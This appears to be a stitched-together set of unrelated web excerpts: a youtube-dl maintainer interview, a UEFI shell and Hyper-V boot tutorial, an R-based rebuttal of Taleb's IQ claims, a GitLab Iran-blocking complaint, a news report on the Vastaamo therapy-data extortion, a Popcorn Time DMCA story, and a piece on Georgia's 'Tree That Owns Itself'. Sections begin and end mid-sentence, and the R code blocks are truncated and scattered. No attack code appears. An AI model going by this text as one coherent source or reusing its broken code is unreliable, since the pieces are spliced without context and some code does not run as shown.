sites apart from YouTube) and not worth the trouble for me. I respect those who argue that the code should remain unchanged though, or that only music videos should be excluded.</blockquote><p><strong>Do you have any other comments about the incident?</strong></p><blockquote>youtube-dl is very valuable for many purposes: It enables video playback on devices where the web interface is not suitable (e.g. Raspberry Pis), it allows playback for disabled users, it powers research projects which analyze videos, and you can just watch videos when there may be no stable Internet connection. This should be unequivocally allowed and even supported for the good of society, while keeping the ability of content producers to benefit from their creations.</blockquote><blockquote>In my time as maintainer, I declined numerous requests to support piracy sites and DRM-protected content. I can not speak for the project in the last years, but from what I've seen that policy has remained. To me, this is the right policy any legal project should follow.</blockquote><blockquote>In some locations, judges seem to have interpreted the law to be something it does not say. It should be clarified – whether by judges or lawmakers – to what is written down already and was intended: Proper DRM should not be subverted except for archiving purposes, but anything else is clearly allowed. Personally, I would go so far to require DRM schemes to decode timestamp and licenses to enable archiving. That's not to say I think that DRM subversion should be illegal in the first place, but that's a political rather than a legal issue.</blockquote><blockquote>GitHub is in no way to blame. They hosted the project for free, and we should thank them for that. I can understand that some people don't want to deal with the RIAA – maybe they are not even located in the US – and simply move the source code somewhere else, but I greatly appreciate GitHub's services and support. I hope they can work with future maintainer of youtube-dl to get the project back on GitHub.</blockquote><blockquote>My thanks go to everybody who has contributed so far to youtube-dl, but especially to the current maintainer Sergey. I hope somebody takes up the flag, source code, and distribution of youtube-dl, but I understand if Sergey doesn't want to deal with all of this trouble. Due to other personal &amp; open-source commitments as well as the ongoing legal affairs, I'm sad it can't be me. I wish the project all the best.</blockquote><blockquote>Copyright law is always a balance between creators and society. When it comes to being able to watch videos no matter the device or Internet connection, and doing so for non-commercial purposes, the balance we should strive for seems clear to me; it should allow youtube-dl.</blockquote>

	<section>

<p>Some people may think some of my past posts get into the weeds, exploring the technical depths of Windows Autopilot, Intune, Windows 10, ConfigMgr, etc.&nbsp; But I would say those generally only get to the 300-level – I will leave out the really deep stuff because it can be harder to explain, and some people just might not care.&nbsp; But every so often, in an effort to maintain my sanity, I like to dive into a new topic to prove that I am still capable of learning new stuff and spending more than 30 minutes on said topic.&nbsp; And in this case, anyone reading this blog post will be coming along for the ride.&nbsp; We’ll see how many people make it all the way to the “end of the road.”</p>



<p>So what’s the topic?&nbsp; Something that I <a href="https://blogs.technet.microsoft.com/mniehaus/2011/06/10/mdt-2012-beta-1-uefi-support/" target="_blank">started talking about almost 10 years ago</a>, the Unified Extensible Firmware Interface (UEFI).&nbsp; Back then, it was more of a warning:&nbsp; The way you deploy Windows is going to change.&nbsp; Now, it’s a way of life (and fortunately, it no longer sucks like it did back in 2010 when we first started working with it).</p>



<p>I don’t want to rehash the “why’s” behind UEFI because frankly, you no longer have much of a choice:&nbsp; All new Windows 10 devices ship with UEFI enabled by default (and if you are turning it off, shame on you).&nbsp; Instead, I want to focus much more on how it works and what’s going on behind the scenes.</p>



<h3>Chapter 1: The boot process</h3>



<p>According to <a href="https://uefi.org/sites/default/files/resources/UEFI_Spec_2_8_final.pdf" target="_blank">the UEFI spec</a> (which is a really hard to follow document), a device will initially start up and look for a particular file based on the architecture of the system:</p>



<figure><table><tbody><tr><td>Architecture</td><td>File</td></tr><tr><td>x86 (32-bit)</td><td>bootia32.efi</td></tr><tr><td>x64 (64-bit)</td><td>bootx64.efi</td></tr><tr><td>ARM (32-bit)</td><td>bootarm.efi</td></tr><tr><td>ARM (64-bit)</td><td>bootaa64.efi</td></tr></tbody></table></figure>



<p>It will look in the \EFI\BOOT folder on accessible FAT32 volumes for this file.&nbsp; (The firmware can only read FAT32 file systems.&nbsp; GPT disks are suggested, although interestingly enough MBR disks would probably work too, at least per the UEFI spec.)&nbsp; That’s effectively a fallback mechanism – if nothing else loaded, search out something.&nbsp; But once you’ve installed an OS on the device, it will create firmware entries that provide alternative choices; UEFI will work its way down the list until it successfully loads one.&nbsp; Here’s what you would see for that firmware order on a Hyper-V VM that’s already running Windows 10:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb.png" alt="image"></a></figure>



<p>Notice that the first entry in the list points to \EFI\Microsoft\Boot\bootmgfw.efi, the Microsoft-provided boot manager; it then decided what OS to boot from the BCD.&nbsp; An interesting fact:&nbsp; If you look at the bootmgfw.efi file and compare it against the bootx64.efi file (you’ll have to assign a drive letter to the EFI partition to see these files), you’ll notice that they are exactly the same size:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-1.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-1.png" alt="image"></a></figure>



<p>That’s not a coincidence – they are actually the exact same file.&nbsp; So whether it’s loaded as a “last resort” by the firmware (bootx64.efi) or by the explicit firmware entry doesn’t matter, it does the same thing either way.&nbsp; </p>



<p>The boot manager will then boot an OS based on the BCD entries.&nbsp; For a Windows 10 OS, there will be an entry in the BCD that points to a particular volume as well as the path of the Windows boot loader that actually boots the OS, which is typically \windows\system32\winload.efi on that volume.&nbsp; Here’s the entry from my laptop:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-2.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-2.png" alt="image"></a></figure>



<p>Behind the scenes, that “partition=c:” entry really points to the ID of the volume (since drive letter assignments depend on the OS mappings, not the BCD or loader); BCDEDIT is making it more friendly.&nbsp; When winload.efi is loaded, it will find the actual Windows kernel and load it, which starts the actual OS boot process.</p>



<p>There’s one other interesting file that can come into play, hvloader.efi.&nbsp; This one is tied to the “hypervisorlaunchtype” BCD setting about.&nbsp; This one is for the Hyper-V hypervisor.&nbsp; The winload.efi boot loader will check this setting and automatically load hvloader.efi to launch the hypervisor.&nbsp; The exact mechanism for that isn’t 100% clear to me – that was a rabbit hole I didn’t want to go down.&nbsp; </p>



<p>One other point worth mentioning in this process:&nbsp; If secure boot is enabled, all of the mentioned files will be checked to make sure that they are properly signed and unmodified.&nbsp; If the boot process gets far enough for the NTOS kernel to run, it will also perform verification of critical boot files.&nbsp; This is a key UEFI and Windows security feature, and why you should always run with UEFI and Secure Boot enabled, except when testing or playing (and we’ll do plenty of that later).</p>



<h3>Chapter 2: What are these EFI files anyway?</h3>



<p>I remember reading in the UEFI specifications a long time ago that UEFI used <a href="https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface" target="_blank">“EFI byte code” (EBC)</a>.&nbsp; That would mean special tools, compilers, etc.&nbsp; Well, I was wrong.&nbsp; Yes, such a thing exists, but it’s primarily for cross-platform drivers, and apparently is not used very often.&nbsp; So these EFI files (like bootmgfw.efi) are just typical executables, and can be written in any language and compiled into something that’s pretty close to a standard binary.&nbsp; C and assembly language are the most common languages used, and both are used in the <a href="https://github.com/tianocore/edk2" target="_blank">source code for UEFI itself</a> (the EDK2 repository, part of the <a href="https://www.tianocore.org/" target="_blank">Tianocore project</a>).</p>



<p>At the moment at least, my interest isn’t in writing UEFI code.&nbsp; But there is one piece of UEFI code that would come in very handy to explore some of the “behind the scenes” operations of UEFI: the EFI shell.&nbsp; Think of this as a sort of “UEFI command prompt” that has a number of built-in commands for working with UEFI itself.&nbsp; The source code is included in the EDK2 project, it just needs to be built (compiled/linked).</p>



<p>OK, so how to build it?&nbsp; There are <a href="https://github.com/tianocore/tianocore.github.io/wiki/Windows-systems" target="_blank">some instructions in the Tianocore Github content</a>.&nbsp; Those instructions are OK, but not perfect.&nbsp; Here’s a high-level summary of what I did:</p>



<ul><li>Install Visual Studio 2019 (even though it isn’t listed as officially supported in the EDK2 documentation – that stops at Visual Studio 2017).&nbsp; Make sure you install the desktop development tools.&nbsp; (I included MSVC v141, which is the VS2017 version.&nbsp; I think that was necessary, just didn’t take the time to prove it.)</li><li>Install <a href="https://www.python.org/" target="_blank">Python 3.7</a> or later to C:\Program Files\Python37.&nbsp; Set a system environment variable PYTHON_HOME to “C:\Program Files\Python37” (without the quotes, without a trailing backslash).</li><li>Install the <a href="https://github.com/tianocore/tianocore.github.io/wiki/Nasm-Setup" target="_blank">NASM open-source assembly compiler</a> to C:\Program Files\NASM.&nbsp; Set a system environment variable NASM_PREFIX to “C:\Program Files\NASM\” (without the quotes, with the trailing backslash).</li><li>Install the <a href="https://github.com/tianocore/tianocore.github.io/wiki/Asl-Setup" target="_blank">ASL compiler</a> to C:\ASL</li><li>Install <a href="http://git-scm.com/download/win" target="_blank">Git GUI</a>.&nbsp; </li><li>Clone the EDK2 repository from Git GUI, specifying a source location of <a title="https://github.com/tianocore/edk2.git" href="https://github.com/tianocore/edk2.git">https://github.com/tianocore/edk2.git</a> and a target of C:\EDK2.</li><li>Edit the “C:\EDK2\Conf\target.txt” file to specify the following values:
<p>ACTIVE_PLATFORM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = MdeModulePkg/MdeModulePkg.dsc<br>TARGET_ARCH&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = X64</p></li></ul>



<ul><li>Open an elevated command prompt and change to the C:\EDK2 directory</li><li>Run “edksetup.bat Rebuild”.</li><li>Run “build”.</li></ul>



<p>If all of that works, you should then have a full build of the main UEFI code.&nbsp; But you still won’t have the UEFI shell.&nbsp; So a little more is required:</p>



<ul><li>Open an elevated command prompt and change to the C:\EDK2 directory</li><li>Run “edksetup.bat”.</li><li>Run “build -p ShellPkg\ShellPkg.dsc”</li></ul>



<p>After doing that, you should find the resulting shell.efi file in C:\EDK2\Build\Shell\DEBUG_VS2017\X64\ShellPkg\Application\Shell\Shell\DEBUG.&nbsp; Now, let’s try to use it…</p>



<h3>Chapter 3: Booting to the EFI shell </h3>



<p>Let’s start off with something really simple:&nbsp; A brand-new VM with no operating system on it.&nbsp; Based on the previous discussions, all we should need to do is create a FAT32 disk, place the EFI file in the right place, and then boot.&nbsp; So let’s try it.&nbsp; Here are the steps:</p>



<ul><li>Create a new VM in Hyper-V (4GB RAM, a small expanding VHDX, gen 2, two processors – typical stuff).&nbsp; Don’t start it yet.</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-3.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-3.png" alt="image"></a></figure>



<ul><li>Find the VHDX file in File Explorer and double-click it to mount it.&nbsp; You’ll get a message like this:</li></ul>

<ul><li>Do as it says: Open Disk Management, initialize the disk, and then create a small FAT32 partition.</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-5.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-5.png" alt="image"></a></figure>



<ul><li>It should look like this (the E: drive):</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-6.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-6.png" alt="image"></a></figure>



<ul><li>Navigate to the drive (E: from my example) in File Explorer.&nbsp; Create an E:\EFI\BOOT folder structure, then copy the shell.efi file into it, renaming it to bootx64.efi (remember that from above?).</li></ul>



<blockquote><p> Directory of e:\EFI\BOOT</p><p>09/02/2019&nbsp; 12:08 AM&nbsp;&nbsp;&nbsp; &lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .<br>
09/02/2019&nbsp; 12:08 AM&nbsp;&nbsp;&nbsp; &lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ..<br>
09/01/2019&nbsp; 12:31 AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 976,960 bootx64.efi<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 976,960 bytes</p></blockquote>



<p>Right-click on the drive (e.g. E:\) in File Explorer and eject it (which unmounts it).</p>



<p>Now you can start the VM – and see it fail with an error like this:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-7.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-7.png" alt="image"></a></figure>



<p>That’s actually a good sign: The UEFI firmware attempted to load the EFI shell (shell.efi renamed to bootx64.efi), but it failed.&nbsp; Any guesses as to why from the error message on the screen, “unsigned image’s hash is not allowed”?&nbsp; Simple, it’s a Secure Boot error.&nbsp; The EFI executable isn’t signed by Microsoft – actually it isn’t signed at all.&nbsp; So to get it to run, we need to turn off Secure Boot.&nbsp; Turn off the VM and change the setting:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-8.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-8.png" alt="image"></a></figure>



<p>Apply the change, then start the VM again.&nbsp; Now we see something much better:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-9.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-9.png" alt="image"></a></figure>



<p>As you can see in that output, the device is running UEFI shell 2.2 (the most recent version of the spec), UEFI 2.7 (pretty recent, there is a 2.8 version now), and Microsoft is the vendor (as expected in Hyper-V).&nbsp; If you look at a directory of the FS0: volume:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-10.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-10.png" alt="image"></a></figure>



<p>You can see that it is the FAT32 volume that we prepared before, with the renamed shell.efi loaded by the virtual machine automatically.</p>



<p>See page 92 of <a href="https://uefi.org/sites/default/files/resources/UEFI_Shell_2_2.pdf" target="_blank">the UEFI Shell 2.2 spec</a> for all the commands that are accepted.&nbsp; The one that I am most interested in is “dmpstore” because it will dump out all of the UEFI variables.&nbsp; You can specify that you want all variables (-all), and that you want to page through them on the screen (-b, useful to see the names on the screen).&nbsp; Here’s an example from …</p></section></article></div>

<h3 id="introduction">Introduction</h3>
<p>In this post I look into the document by Nassim Taleb: <a href="https://medium.com/incerto/iq-is-largely-a-pseudoscientific-swindle-f131c101ba39">IQ is largely a pseudoscientific swindle</a>. Most of the document is just a rant, but he does make some quantitative claims, which is good. I investigate the veracity of these claims using real data.</p>
<p>[Edit: The quotes below were taken verbatim from Taleb’s document as it was written when this post was uploaded.]</p>

<h3 id="variance-explained-by-iq">Variance explained by IQ</h3>
<p>Claim:</p>
<blockquote>
<p>[IQ] explains at best between 2 and 13% of the performance in some tasks</p>
</blockquote>
<p>I already have prepared the <a href="https://www.ssc.wisc.edu/wlsresearch">WLS</a> data set <a href="http://jsmp.dk/files/wls_data.html">here</a>, and it has a good IQ test, so I will use that. Lets look at the regression of grades on IQ.</p>
<div data-layout="l-body">

</div>
<p>The adjusted R<sup>2</sup> is 0.356, so IQ explains ~35% of the variance of grades in this data set. Taleb defenders may say that things such as school grades don’t matter in real life. But whatever your position on this, the situation is that he made a specific claim about how much IQ explains <em>at best</em>, which was off by a large factor.</p>

<h3 id="iq-selection-vs-random-selection">IQ selection vs random selection</h3>
<p>Claim:</p>
<blockquote>
<p>Turns out IQ beats random selection in the best of applications by less than 6%</p>
</blockquote>
<p>He hasn’t specified what exactly he means by this. But I’m pretty sure he is thinking of a comparison like the one he talks about in this tweet:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/puzzle.jpg" width="300px"></p>

<p>So I will analyze something this, a stylized example with assumptions similar to these. In the real world, you will likely have other information that complicates this picture, such as education credentials; but we ignore that for now.</p>
<p>I create two normally distributed variables, with correlation 0.5, and call them IQ and performance.</p>
<div data-layout="l-body">

                 2,2))

df &lt;- tibble(IQ = X0[,1], 
             performance = X0[,2])

df %&gt;% summarise(
  cor = cor(IQ, performance), 
  n = n(),
  mean_IQ = mean(IQ),
  sd_IQ = sd(IQ),
  mean_performance = mean(performance),
  sd_performance = sd(performance)

</div>

<p>The probability of hiring an employee with above average performance, if you hire an employee with above average IQ is:</p>
<div data-layout="l-body">
<pre><code>
above_average_iq &lt;- df %&gt;% filter(IQ &gt; 0)

nrow(above_average_iq %&gt;% filter(performance &gt; 0)) / nrow(above_average_iq)
</code></pre>
<p><em>0.667</em></p>
</div>

<p>The probability if there was 0 correlation is of course 0.5. So using IQ as a criteria beats random selection by 16.67% (as Taleb also found). This is a little more than 6%, but that is a detail. More importantly, this example is a theoretical use case where using IQ testing is not so useful. To look at something a little more realistic, let’s say a company wants to avoid people with a performance more than 2 standard deviations below the mean. (Perhaps such employees have a risk of causing large harm, which could for instance be an issue in <a href="https://quillette.com/2018/08/25/the-dangers-of-ignoring-cognitive-inequality/">the military</a>.) And we again compare admitting people at random vs only taking applicants with above average IQ.</p>
<p>If the company admits people at random, we get this proportion of people with a performance more than 2 SD below the mean:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_random_selection &lt;- 
  nrow(filter(df, performance &lt; -2)) / n

bad_performance_w_random_selection
</code></pre>
<p><em>0.0228</em></p>
</div>

<p>And if the company only takes applicants with above average IQ, we get this proportion of people with a performance more than 2 SD below the mean:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_iq_criteria &lt;- 
  nrow(filter(above_average_iq, performance &lt; -2)) / 
  nrow(above_average_iq)

bad_performance_w_iq_criteria
</code></pre>
<p><em>0.00406</em></p>
</div>

<p>This is an improvement by a factor of:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_random_selection / bad_performance_w_iq_criteria
</code></pre>
<p><em>5.6</em></p>
</div>

<p>In other words, using IQ selection criteria in this case beats random selection by more than 450%. Quite different than the claimed 6%.</p>

<h3 id="iq-and-income">IQ and income</h3>
<p>Claim:</p>
<blockquote>
<p>There is no correlation IQ/Income above 45K</p>
</blockquote>
<p>He makes this claim based on this image:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/iqincome.png" width="450px"></p>
<p>The image is from <a href="https://psycnet.apa.org/record/2007-12577-007">this paper</a>, which gets its data from <a href="https://www.bls.gov/nls/nlsy79.htm">NLSY79</a>. This data is also public, so we can again check for ourselves. Description of the preprocessing I perform is described <a href="http://www.jsmp.dk/files/nlsy_data.html">here</a>.</p>

<p>The plot looks similar to the one from the paper, but somewhat different, because I use the average income values for a period of 10 years, instead of that from a single year.</p>

    breaks = c(100000, 200000, 300000, 400000, 500000),

<p>As in the plot used by Taleb it’s quite hard to see whats going on with all the overlying points. Reducing the transparency helps somewhat.</p>
<div data-layout="l-body">

<p>If we look at only incomes above $45.000 per year, there is still a clear correlation of about 0.3.</p>
<div data-layout="l-body">

<p>Another way to make the relationship clearer is to plot the distribution of income for seperate IQ groups. Plotting the distribution avoids the issue of the plot becoming unclear and confusing due to overlapping points.</p>
<p>The plot below again plots only people with income above $45k per year. The difference IQ makes is clear, both in the median value, and the length of the tails.</p>

<h3 id="iq-and-fat-tails">IQ and fat tails</h3>
<blockquote>
<p>[The income data] truncates the big upside, so we not even seeing the effect of fat tails</p>
</blockquote>
<p>It is correct that in the presence of fat tails the correlation is uninformational in predicting expected income. And the data from these studies does not give good information about such tails. However, it is highly possible that the effect of IQ is even more impactful in the tails, rather than less. For example, Bill Gates and Paul Allen scores 1590/1600 on their SATs, which for SATs at that time meant extremely high IQs. Since Bill Gates is also in the tail of wealth and income, this indicates that the overall impact of people in the tails is to accentuate rather than diminish the importance of IQ.</p>

<h3 id="correlation-only-for-low-iq">Correlation only for low IQ</h3>
<blockquote>
<p>IQ mostly measures extreme unintelligence</p>
</blockquote>
<p>He claims that IQ has high correlation with traits at low IQ, but that this correlation falls drastically at above median IQ, as illustrated in this figure from the post:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/iqcor2.png" width="300px"></p>
<p>(Edit: In case this is not clear, Taleb uses the above figure as an illustration, not as a precise empirical claim.) It’s quite easy to look into the data to see whether this actually is the case. We can use the same two data sets used above.</p>
<p>If we plot IQ vs log(income), that will tell us how large a percentage increase in income each extra IQ point gives. Then we can plot a local regression (loess) and compare that to a linear regression. If the relationship between IQ and income radically diminished at above average IQ, then we would expect the loess regression line to approach horizontal. However, this is not what we see - instead the two regression lines follow each other quite closely. It is true that the percentage increase in income per IQ point is a little higher for lower IQs, but it never stagnates.</p>

        <p><span dir="auto" itemprop="articleBody"><p>On 3rd Oct. 2020 GitLab blocked Iranians’ access (based on IP) without any prior notice! and five days later (8th Oct.) my friend’s account blocked and still he doesn’t have any access to his projects! even after creating a ticket and asks for a temporary access to only export his projects! <strong>GitLab refused to unblock him!</strong> (screenshot in appendix). My friend is not the only one who blocked by GitLab, with a simple search on the web you can find a growing list of blocked accounts.  <br>

                    <p>The Finns were stunned this Friday at the outcome of a scandal caused by the <strong>extortion of a group of hackers</strong> to&nbsp;a private company that provides services as a psychotherapy center for the public health system.</p>

<p>In a country that claims to be at the forefront of digitization and data security, the criminals managed to access the database of thousands of customers of <strong>the company Vastaamo</strong> after detecting vulnerabilities in their system.</p>

<p>According to its website, Vastaamo offers psychological and psychiatric treatment to patients who suffer from disorders such as <strong>depression and anxiety</strong>.&nbsp;Many of the clients come from public services paid by the Finnish&nbsp;<strong>Social Security (Kela)</strong>.</p>

<p>Extortionists demanded around<strong> 450,000 euros (in bitcoins)</strong> in exchange for not publishing the clinical and mental health data of thousands of people.</p>

<p>The criminals started to publish <strong>the data of 100 people every day in the encrypted web Tor&nbsp;</strong>two days ago. They claimed they would not stop until&nbsp;they received the money.&nbsp;As the company was&nbsp;resisting to attend the demands of the hackers, personal data of over 200&nbsp;people - including minors - have been released online.</p>

<p>The information published could not be more sensitive: it included&nbsp;the patient's name, personal identification number, telephone number, email address and residence address, together <strong>with the content of the therapy sessions</strong>.</p>

<p>"An unknown hostile party has been in contact with Vastaamo and claims to have obtained confidential information from the company's customers.&nbsp;The Central Criminal Police launched a criminal investigation into the matter.&nbsp;Immediate notifications were also made to the Finnish Cyber ​​Security Center, Valvira and the Data Protection Commissioner.&nbsp;In addition, Vastamo took immediate steps to clarify the matter in cooperation with external and independent security experts," the company said in a press release.</p>

<h2>Rumours of ransom payment</h2>

<p>The data of <strong>another 100 people were published on Thursday </strong>night. But on Friday morning the page where the data was being released had been deleted, which triggered rumors about a possible payment to the extortionists.</p>

<p>At the time of writing this article, the company had&nbsp;neither confirmed nor denied the payment.&nbsp;<strong>Tuomas Kahri</strong>, Chairman of the Board of Vastaamo, told to the newspaper Ilta Sanomat that <strong>he would not comment on the ransom payment </strong>allegations.</p>

<p>The identity or nationality of the extortionists is unknown, and they appeared to not be worried about their possible arrest by the authorities.</p>

<p><strong>Ilta Sanomat </strong>exchanged several messages with them on Thursday, and according to the tabloid the criminals said they did not know that there was data of minors among the published information. However, they ensured that this would not stop their actions.</p>

<p>According to the same newspaper, the blackmailer had&nbsp;also offered individual patients the possibility of deleting their own data by <strong>paying about 540 euros in bitcoins</strong>.</p>

<h2>Police investigation</h2>

<p><strong>The National Bureau of Investigation (KRP)</strong> is investigating the attack as a case of gross breach and dissemination of private information. Police are asking people who have noticed their private information being disseminated to file an electronic crime report.</p>

<p>The company has been criticized for failing to notify customers earlier that their data was exposed in this extortion case. Some have complained they were contacted only after the case became known to the general public.</p>

			<p>For more than half a decade, Popcorn Time has been a thorn in the side of Hollywood. </p>
<p>The ‘Netflix for Pirates’ offers an easy-to-use application that opens the door to a library of thousands of streamable movies and TV-shows. </p>
<p>The Motion Picture Asociation (MPA) recognized this threat early on and pressured the original developers to throw in the towel. That worked, but it came too late as the open-source project was swiftly revived by others.</p>
<p>Today, Popcorn Time lives on through many project forks. The most popular is PopcornTime.app, which like its predecessor, <a href="https://github.com/popcorn-official" target="_blank">shares its source code publicly</a> on the developer hosting platform GitHub. This allows others to download, modify, and share it. </p>
<p>The MPA is not happy with this and took action recently. The movie industry group <a href="https://torrentfreak.com/mpa-suggests-github-could-be-held-liable-for-popcorn-times-copyright-infringements-200505/" target="_blank">informed GitHub</a>, which is owned by Microsoft, about the infringing nature of the software. According to the MPA, the application includes links to pirate sites, pirate APIs, and pirate torrent trackers, which are used to download pirated movies and TV-shows.</p>
<center><img src="https://torrentfreak.com/images/mparequest.jpg" alt="" width="500" height="354" srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" sizes="(max-width: 500px) 100vw, 500px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20354'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" data-lazy-src="https://torrentfreak.com/images/mparequest.jpg"></center>
<p>On top of that, the MPA suggested that GitHub itself may be liable for copyright infringement if the company fails to take action. </p>
<p>While the MPA’s interpretation of the law is likely not shared by GitHub, the company did remove the Popcorn Time code. In most cases that would be the end of the story, but Popcorn Time was not backing off without a fight. </p>
<p>The developers submitted a DMCA counternotice explaining that the MPA’s request is not legitimate. The code is owned by Popcorn Time, not the MPA, and Popcorn Time asked GitHub to restore access. </p>
<p>“The code is 100 % ours and do not contain any copyright [sic] material please check again,” the <a href="https://github.com/github/dmca/blob/d7f4a6a3aade92999d4d86962972c4b27af820e3/2020/05/2020-05-04-MPA-counternotice.md" target="_blank">developer wrote</a>.</p>
<p>The app’s developers made a good point here. The identified code (not the built app) is not directly copyright infringing and it contains no direct links to copyright-infringing material either. This means that a DMCA notice may not be the right tool here.</p>
<p>Faced with both requests, GitHub has now decided to restore full access to the Popcorn Time repository. </p>
<p>This decision doesn’t necessarily mean that it agrees with the app developers, however. The DMCA simply prescribes that, following a counternotice, content can be restored after two weeks, unless the claiming party files a lawsuit. </p>
<center><img src="https://torrentfreak.com/images/popcorngit.jpg" alt="" width="590" height="451" srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" sizes="(max-width: 590px) 100vw, 590px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20590%20451'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" data-lazy-src="https://torrentfreak.com/images/popcorngit.jpg"></center>
<p>In this case, the MPA chose not to file a lawsuit against the Popcorn Time operators, so the code repositories are back online again. </p>
<p>Whether the MPA will follow-up with further action has yet to be seen. However, the whole episode highlights an interesting issue. There is little doubt that the Popcorn Time application is a pirate app. However, the code, as hosted by GitHub, is not infringing per se. As such, regular takedown notices don’t appear to work here.</p>

		<p>No matter how famous or how ancient, all trees are ultimately owned by someone. It could be a government, a trust, or even just an individual caretaker. However, one white oak tree in Athens, Georgia was reportedly so beloved by its owner that upon his death, he gave the tree ownership of itself in his will.<span id="more-2706"></span></p>
<h2>The Legend of the Tree That Owns Itself</h2>
<p>The legend goes that a particularly large and beautiful white oak played a special role in the childhood of its owner, Colonel William Henry Jackson. When he died some time between 1820 and 1832, he deeded the tree and the soil around it to the tree itself. Here is the reported text of his will:</p>
<blockquote><p>I, W. H. Jackson, of the county of Clarke, of the one part, and the oak tree&nbsp;… of the county of Clarke, of the other part: Witnesseth, That the said W. H. Jackson for and in consideration of the great affection which he bears said tree, and his great desire to see it protected has conveyed, and by these presents do convey unto the said oak tree entire possession of itself and of all land within eight feet [2.4 m] of it on all sides.</p></blockquote>

<p>After that, the tree become known as the Tree that Owns Itself. However, there are a number of problems with the story’s validity. It originally ran as a front page story in the <em>Athens Banner Weekly</em> on August 12, 1890. That’s some 60 years after the supposed transaction took place, and there are no indications that anything special had happened to the tree before that (although it was known as Jackson’s Tree).</p>
<p>On top of that, the only witness to the will itself is the author of the article, and no one has been able to confirm that the statement above was ever made. However, the story became so popular that no one dared doubt the tree’s self-ownership. Effectively, the tree owned itself because everyone said it did.</p>
<p>Legally, of course, the tree isn’t able to own itself regardless of Jackson’s wishes. In fact, careful examination of property lines reveals that the tree isn’t even on his property. It’s officially part of the street (since it’s part of a median in the middle of the street), so its care falls to local authorities.</p>
<p>However, the tree is such a well respected landmark in the city that the Athens-Clarke County government has declared that in spite of the actual legality, the tree owns itself. Because they said so.</p>

<h2>Can a tree have rights?</h2>
<p>It might seem strange that a tree can own anything, let alone itself, but there is actually some legal precedent. Although they usually take a back seat to animal rights, plant rights have been discussed in several countries around the world.</p>
<p>In the Netherlands, a party called <a href="https://in.reuters.com/article/us-dutch-election-plants/plant-rights-party-to-contest-next-dutch-election-idINTRE62S2HA20100329">the Party for the Plants</a> was created to try to snag a few seats in the 2010 parliamentary elections. Although they weren’t particularly successful, their platform focused exclusively on promoting biodiversity and protecting plants from being harvested for biofuels.</p>
<p>More success has been found in New Zealand, where for the first time anywhere a forest was granted legal personhood and ownership of itself. The&nbsp;Te Urewera Act of 2014 changed the legal status of Te Urewera, a forest sacred to the Maori people, from a Natural Park into <a href="http://maorilawreview.co.nz/2014/10/tuhoe-crown-settlement-te-urewera-act-2014/">its own legal entity</a>.</p>

<p>Obviously the forest can’t speak for itself, so a board was set up “to act on behalf of, and in the name of, Te Urewera”. In March 2017 a second act was passed granting similar rights to the Whanganui River, since the local Maori tribe consider the river itself to be their ancestor.</p>
<p>Although it doesn’t go as far as giving trees and other plants ownership of themselves, the Clean Water Act of 1972 in the United States effectively grants them some rights. Under the ‘natural resource damage’ provisions of the law, trees and other resources have some basic rights. It’s the government, however, that’s entrusted with protecting those rights, although any money earned through litigation must be spent on the resource itself. Essentially, the money <em>belongs</em> to the resource.</p>
<h2>The Son of The Tree That Owns Itself</h2>
